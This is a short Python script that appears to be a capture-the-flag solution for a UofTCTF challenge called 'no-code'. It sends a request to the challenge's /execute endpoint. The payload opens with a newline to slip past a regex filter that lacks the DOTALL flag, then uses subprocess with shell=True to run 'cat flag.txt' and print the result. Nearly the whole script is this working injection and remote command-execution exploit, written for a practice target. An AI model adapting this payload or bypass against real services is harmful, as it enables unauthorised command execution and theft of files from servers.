import requests

base_url = "https://uoftctf-no-code.chals.io/"

# Adding a newline to the beginning of the payload bypasses the check because the DOTALL regex flag wasn't used

res = requests.post(f"{base_url}/execute", data={"code": "\nstr(__import__('subprocess').check_output('cat flag.txt',shell=True))"}, headers={"content-type": "application/x-www-form-urlencoded"})
print(res.text)